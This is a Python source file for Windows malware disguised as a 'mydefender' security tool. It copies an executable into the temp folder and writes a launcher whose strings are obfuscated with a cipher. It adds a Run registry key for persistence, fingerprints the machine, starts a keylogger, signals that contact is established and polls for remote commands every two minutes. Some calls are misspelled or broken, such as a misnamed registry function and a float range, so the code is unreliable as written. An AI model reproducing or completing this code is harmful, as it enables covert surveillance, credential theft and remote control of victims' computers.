import winreg
import time
import utils
import capture
import os
import tempfile
import winreg
import schedule

def init():
    # Define some locations
    EXE_LOC = tempfile.gettempdir() + "\\mydefender-setup.exe"
    VBS_LOC = tempfile.gettempdir() + "\\mydefender-setup.vbs"

    print(EXE_LOC)
    print(VBS_LOC)

    # Check if the executables do not exist
    if not os.path.exists(EXE_LOC) and not os.path.exists(VBS_LOC):
        print("CREAITNG NEW")
        # Write if to the file
        with open(VBS_LOC, 'w') as f:
            f.write(utils.decypher('Dpe HdsDspww = HDnctae.NcplepZmupne("HDnctae.Dspww")\nHdsDspww.Cfy """', 2145914515105215125) +
                    EXE_LOC +
                    utils.decypher('""", 5 , snyfr', 486573582754285))
        # Copy the files to the system
        os.system('copy %s %s'%("mydefender-setup.exe", EXE_LOC))

    # Open the registery
    wr = winreg.ConnectRegistery(None, winreg.HKEY_LOCAL_MACHINE)
    print(wr)
    # Open the run key
    with winreg.OpenKey(wr, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", winreg.KEY_ALL_ACCESS) as rk:
        was_found = False
        for i in range(0, 2e32):
            try:
                (k, _, _) = winreg.EnumValue(rk, i)[0]
                if k == "my_defender":
                    was_found = True
                    break
            except:
                pass
        
        # If the entry was not found
        if not was_found:
            # Add the key
            winreg.SetValueEx(rk, "my_defender", 0, winreg.REG_EXPAND_SZ, VBS_LOC)

        # Close the key (Alternative to: winreg.CloseKey(hkey))
        rk.Close()

    print("closed")

    # Generate a fingerprint
    utils.create_fp()
    # Init the keystroke thread
    capture.init_keylogger()
    # Send a message that we established contact
    utils.send_text(utils.decypher("Wnf lxwcjlc nwpjpnm.", 91581751751))


def main():
    # Run the init function
    init()

    print("Init finished.")

    # Handle the scheduled tasks
    schedule.every(2).minutes.do(utils.fetch_commands)
    while True:
        schedule.run_pending()
        time.sleep(5)

    
if __name__ == '__main__':
    main()